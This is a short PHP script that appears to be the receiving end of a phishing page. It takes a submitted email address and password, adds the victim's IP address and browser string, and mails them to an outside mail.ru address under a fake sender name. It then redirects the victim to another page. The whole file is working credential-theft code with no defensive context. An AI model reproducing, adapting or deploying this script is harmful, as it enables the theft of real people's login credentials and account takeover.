<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Email ID *: ".$_POST['1']."\n";
$message .= "Password*: ".$_POST['2']."\n";
$message .= "IP: ".$ip."\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$login = $_POST['1'];


$recipient = "david.lee.1972@mail.ru";
$sender = 'jn2222@126.com';
$headers .= "From: YHN 2<$sender>\n";
$subject = "YHN 2";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: index3.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }